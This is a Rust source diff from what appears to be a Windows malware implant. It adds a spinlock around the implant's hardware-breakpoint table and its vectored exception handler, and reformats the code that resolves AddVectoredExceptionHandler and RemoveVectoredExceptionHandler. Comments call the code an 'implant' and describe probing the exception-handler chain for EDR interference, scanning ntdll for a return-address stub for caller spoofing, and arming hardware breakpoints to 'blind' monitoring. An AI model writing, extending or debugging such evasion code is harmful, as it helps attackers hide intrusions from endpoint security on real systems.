@@ -91,6 +91,53 @@ static mut HWBP_COUNT: usize = 0;
 static mut VEH_HANDLE: *mut core::ffi::c_void = core::ptr::null_mut();
 static mut SHADOW_BUF: *mut u8 = core::ptr::null_mut();
 
+/// Simple spinlock for HWBP state. The VEH handler runs in the faulting
+/// thread's context; we briefly hold this lock during add/remove/scan.
+/// IRQs are not disabled (we're in user mode), but the critical sections
+/// are tiny (<10 instructions), making preemption mid-section unlikely
+/// to cause issues.
+struct HwbpLock {
+    locked: core::sync::atomic::AtomicBool,
+}
+impl HwbpLock {
+    const fn new() -> Self {
+        Self {
+            locked: core::sync::atomic::AtomicBool::new(false),
+        }
+    }
+    fn lock(&self) {
+        while self
+            .locked
+            .compare_exchange_weak(
+                false,
+                true,
+                core::sync::atomic::Ordering::Acquire,
+                core::sync::atomic::Ordering::Relaxed,
+            )
+            .is_err()
+        {
+            core::hint::spin_loop();
+        }
+    }
+    /// Non-blocking attempt. Used in the VEH handler where we must not spin.
+    /// Returns true if the lock was acquired.
+    fn try_lock(&self) -> bool {
+        self.locked
+            .compare_exchange(
+                false,
+                true,
+                core::sync::atomic::Ordering::Acquire,
+                core::sync::atomic::Ordering::Relaxed,
+            )
+            .is_ok()
+    }
+    fn unlock(&self) {
+        self.locked
+            .store(false, core::sync::atomic::Ordering::Release);
+    }
+}
+static HWBP_LOCK: HwbpLock = HwbpLock::new();
+
 /// true = VEH chain appears clean / safe to register our HWBP handler.
 /// Set false by veh_chain_has_handlers() if probe detects pre-existing
 /// handlers or EDR interference. Implant SHOULD check this before relying
@@ -118,7 +165,7 @@ pub unsafe fn init_countermeasures() {
     // Scan for return-address stub (ADD RSP,X; RET or bare RET in ntdll).
     if let Some(stub) = crate::caller_spoof::scan_return_stub() {
         diag(b'R'); // stub found
-        // Store for future use by caller-spoof thunk.
+                    // Store for future use by caller-spoof thunk.
         let _ = stub;
     }
 }
@@ -362,6 +409,17 @@ pub unsafe extern "system" fn hwbp_veh_handler(ep: usize) -> i32 {
     // ContextRecord.Rip at x64 CONTEXT offset 0x0F8
     let rip = core::ptr::read_unaligned(ctx.add(CTX_RIP) as *const u64) as usize;
 
+    // Acquire the HWBP lock before scanning HWBP_ENTRIES. In the VEH handler
+    // we must not spin (exception dispatch is time-critical and re-entrant
+    // spinning could deadlock), so use try_lock: if add/remove is mid-update,
+    // bail out and let the next exception retry.
+    if !HWBP_LOCK.try_lock() {
+        if DIAG_ENABLED.load(core::sync::atomic::Ordering::Relaxed) {
+            vehtag(b'L');
+        } // lock busy
+        return EXCEPTION_CONTINUE_SEARCH;
+    }
+
     // Check DR6 bits against our registered breakpoints.
     for i in 0..4u8 {
         if (slot_bits & (1 << i)) == 0 {
@@ -401,17 +459,18 @@ pub unsafe extern "system" fn hwbp_veh_handler(ep: usize) -> i32 {
                 if DIAG_ENABLED.load(core::sync::atomic::Ordering::Relaxed) {
                     vehtag(b'X');
                 } // done
+                HWBP_LOCK.unlock();
                 return EXCEPTION_CONTINUE_EXECUTION;
             }
         }
     }
 
+    HWBP_LOCK.unlock();
     if DIAG_ENABLED.load(core::sync::atomic::Ordering::Relaxed) {
         vehtag(b'M');
     } // no match
     EXCEPTION_CONTINUE_SEARCH
 }
-
 
 // ---- VEH CHAIN PROBE ------------------------------------------------------
 
@@ -436,19 +495,17 @@ unsafe extern "system" fn probe_veh_handler(_ep: usize) -> i32 {
 pub(crate) fn veh_chain_has_handlers() -> bool {
     unsafe {
         // Resolve AddVectoredExceptionHandler
-        let add_addr = match crate::resolve::export_addr(
-            b"kernelbase.dll",
-            b"AddVectoredExceptionHandler",
-        )
-        .or_else(|| {
-            crate::resolve::export_addr(b"kernel32.dll", b"AddVectoredExceptionHandler")
-        }) {
-            Some(a) => a,
-            None => {
-                VEH_SAFE.store(false, core::sync::atomic::Ordering::Release);
-                return true;
-            }
-        };
+        let add_addr =
+            match crate::resolve::export_addr(b"kernelbase.dll", b"AddVectoredExceptionHandler")
+                .or_else(|| {
+                    crate::resolve::export_addr(b"kernel32.dll", b"AddVectoredExceptionHandler")
+                }) {
+                Some(a) => a,
+                None => {
+                    VEH_SAFE.store(false, core::sync::atomic::Ordering::Release);
+                    return true;
+                }
+            };
         type AddVEH = unsafe extern "system" fn(
             usize,
             unsafe extern "system" fn(usize) -> i32,
@@ -456,21 +513,18 @@ pub(crate) fn veh_chain_has_handlers() -> bool {
         let add: AddVEH = core::mem::transmute(add_addr);
 
         // Resolve RemoveVectoredExceptionHandler
-        let rm_addr = match crate::resolve::export_addr(
-            b"kernelbase.dll",
-            b"RemoveVectoredExceptionHandler",
-        )
-        .or_else(|| {
-            crate::resolve::export_addr(b"kernel32.dll", b"RemoveVectoredExceptionHandler")
-        }) {
-            Some(a) => a,
-            None => {
-                VEH_SAFE.store(false, core::sync::atomic::Ordering::Release);
-                return true;
-            }
-        };
-        type RemoveVEH =
-            unsafe extern "system" fn(*mut core::ffi::c_void) -> u32;
+        let rm_addr =
+            match crate::resolve::export_addr(b"kernelbase.dll", b"RemoveVectoredExceptionHandler")
+                .or_else(|| {
+                    crate::resolve::export_addr(b"kernel32.dll", b"RemoveVectoredExceptionHandler")
+                }) {
+                Some(a) => a,
+                None => {
+                    VEH_SAFE.store(false, core::sync::atomic::Ordering::Release);
+                    return true;
+                }
+            };
+        type RemoveVEH = unsafe extern "system" fn(*mut core::ffi::c_void) -> u32;
         let rm: RemoveVEH = core::mem::transmute(rm_addr);
 
         // Register probe at the front of the chain (First = 1).
@@ -527,7 +581,9 @@ pub unsafe fn add_hwbp(target_addr: usize, shadow_type: ShadowType) -> Result<us
     };
     diag(b'b'); // shadow addr OK
     let slot = {
-        let entries: *const Option<HwbpEntry> = (&raw const HWBP_ENTRIES).cast::<Option<HwbpEntry>>();
+        HWBP_LOCK.lock();
+        let entries: *const Option<HwbpEntry> =
+            (&raw const HWBP_ENTRIES).cast::<Option<HwbpEntry>>();
         let mut found = None;
         for i in 0..4usize {
             if core::ptr::read(entries.add(i)).is_none() {
@@ -536,8 +592,12 @@ pub unsafe fn add_hwbp(target_addr: usize, shadow_type: ShadowType) -> Result<us
             }
         }
         match found {
-            Some(s) => s,
+            Some(s) => {
+                HWBP_LOCK.unlock();
+                s
+            }
             None => {
+                HWBP_LOCK.unlock();
                 diag(b'3');
                 return Err("all 4 DR slots full");
             }
@@ -563,7 +623,6 @@ pub unsafe fn add_hwbp(target_addr: usize, shadow_type: ShadowType) -> Result<us
         }
     };
     let ntsct: FnCtx = core::mem::transmute(ntsct_addr);
-
 
     // Probe VEH chain before first registration. If an EDR already has handlers
     // in the chain, our HWBP-based blind approach is compromised — bail out
@@ -709,23 +768,28 @@ pub unsafe fn add_hwbp(target_addr: usize, shadow_type: ShadowType) -> Result<us
     }
     diag(b'j'); // SetContext OK — HWBP armed
 
+    HWBP_LOCK.lock();
     HWBP_ENTRIES[slot] = Some(HwbpEntry {
         target: target_addr,
         shadow,
         original_dr7,
     });
     HWBP_COUNT += 1;
+    HWBP_LOCK.unlock();
     diag(b'k'); // registered
     Ok(slot)
 }
 
 /// Remove a hardware breakpoint and restore the original DR7.
 pub unsafe fn remove_hwbp(slot: usize) -> Result<(), &'static str> {
+    HWBP_LOCK.lock();
     if slot >= 4 || HWBP_ENTRIES[slot].is_none() {
+        HWBP_LOCK.unlock();
         return Err("invalid slot");
     }
     let _entry = HWBP_ENTRIES[slot].take();
     HWBP_COUNT -= 1;
+    HWBP_LOCK.unlock();
 
     // Allocate CONTEXT buffer.
     let va_addr = crate::resolve::export_addr(b"kernelbase.dll", b"VirtualAlloc")
@@ -777,7 +841,10 @@ pub unsafe fn remove_hwbp(slot: usize) -> Result<(), &'static str> {
     free_ctx_buf(ctx_buf);
 
     // Remove VEH when no more breakpoints are active.
-    if HWBP_COUNT == 0 && !VEH_HANDLE.is_null() {
+    HWBP_LOCK.lock();
+    let no_more = HWBP_COUNT == 0;
+    HWBP_LOCK.unlock();
+    if no_more && !VEH_HANDLE.is_null() {
         if let Some(a) =
             crate::resolve::export_addr(b"kernelbase.dll", b"RemoveVectoredExceptionHandler")
                 .or_else(|| {
@@ -805,7 +872,10 @@ unsafe fn free_ctx_buf(buf: *mut core::ffi::c_void) {
 }
 
 pub fn active_count() -> usize {
-    unsafe { HWBP_COUNT }
+    HWBP_LOCK.lock();
+    let n = unsafe { HWBP_COUNT };
+    HWBP_LOCK.unlock();
+    n
 }
 
 pub fn is_ready() -> bool {
